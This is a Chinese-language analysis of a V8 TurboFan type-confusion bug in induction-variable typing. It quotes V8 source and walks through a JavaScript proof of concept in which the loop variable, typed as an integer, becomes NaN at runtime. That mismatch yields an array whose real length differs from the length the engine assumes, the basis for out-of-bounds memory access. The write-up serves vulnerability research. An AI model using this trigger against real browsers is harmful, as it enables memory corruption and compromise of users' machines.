我们直接结合poc来一起分析：

```
function trigger() {
  var x = -Infinity;
  var k = 0;
  for (var i = 0; i < 1; i += x) {
      if (i == -Infinity) {
        x = +Infinity;
      }

      if (++k > 10) {
        break;
      }
  }

  var value = Math.max(i, 1024);
  value = -value;
  value = Math.max(value, -1025);
  value = -value;
  value -= 1022;
  value >>= 1; // *** 3 ***
  value += 10; //
  var array = Array(value);
  array[0] = 1.1;
  return array;
};
```

首先我们分析下面的循环
```
for (var i = 0; i < 1; i += x) {
      if (i == -Infinity) {
        x = +Infinity;
      }
```

我们循环中的x就是下面代码中的increment，i是InductionVariable。

```
Type Typer::Visitor::TypeInductionVariablePhi(Node* node) {
[...]
  const bool both_types_integer = initial_type.Is(typer_->cache_->kInteger) &&
                                  increment_type.Is(typer_->cache_->kInteger);
  bool maybe_nan = false;
  // The addition or subtraction could still produce a NaN, if the integer
  // ranges touch infinity.
  if (both_types_integer) {
    Type resultant_type =
        (arithmetic_type == InductionVariable::ArithmeticType::kAddition)
            ? typer_->operation_typer()->NumberAdd(initial_type, increment_type)
            : typer_->operation_typer()->NumberSubtract(initial_type,
                                                        increment_type);
    maybe_nan = resultant_type.Maybe(Type::NaN()); // *** 1 ***
  }

  if (!both_types_integer || maybe_nan) {
    // Fallback to normal phi typing, but ensure monotonicity.
    // (Unfortunately, without baking in the previous type, monotonicity might
    // be violated because we might not yet have retyped the incrementing
    // operation even though the increment's type might been already reflected
    // in the induction variable phi.)
    Type type = NodeProperties::IsTyped(node) ? NodeProperties::GetType(node)
                                              : Type::None();
    for (int i = 0; i < arity; ++i) {
      type = Type::Union(type, Operand(node, i), zone());
    }
    return type;
  }

[...]
```
因为我们的i初值为0，x初值为负无穷都满足typer\_->cache_->kInteger类型，所以会通过if (both_types_integer)判断，并且\*\*1**处也不会被判断为NAN。


重点来了：
i执行的操作是+=，满足条件arithmetic_type == InductionVariable::ArithmeticType::kAddition，因此，increment_min等于-inf，而increment_max等于inf，那么就直接进入下面的else分支，返回typer\_->cache_->kInteger;类型，也就是\*\*2**处的内容
```
  if (arithmetic_type == InductionVariable::ArithmeticType::kAddition) {
    increment_min = increment_type.Min();
    increment_max = increment_type.Max();
  } else {
    DCHECK_EQ(InductionVariable::ArithmeticType::kSubtraction, arithmetic_type);
    increment_min = -increment_type.Max();
    increment_max = -increment_type.Min();
  }

  if (increment_min >= 0) {
[...]
  } else if (increment_max <= 0) {
[...]
  } else {
    // Shortcut: If the increment can be both positive and negative,
    // the variable can go arbitrarily far, so just return integer.
    return typer_->cache_->kInteger; // *** 2 ***
  }
```

最终会导致turbofan认为poc里的这个循环，i最终类型为typer\_->cache_->kInteger;，然而，在实际的普通js层，测试发现，i最终类型为NaN

```js
  var value = Math.max(i, 1024);  //console.log("value0 "+value);  value = -value;  //console.log("value1 "+value);  value = Math.max(value, -1025);  //console.log("value2 "+value);  value = -value;  //console.log("value3 "+value);
```
![](./img/2.png)

value0 NaNvalue1 NaNvalue2 -2147483648value3 -2147483648
  
``` js 
  value -= 1022;
  value >>= 1; 
  value += 10; 
```

实际长度：1073741323
v8以为的长度：11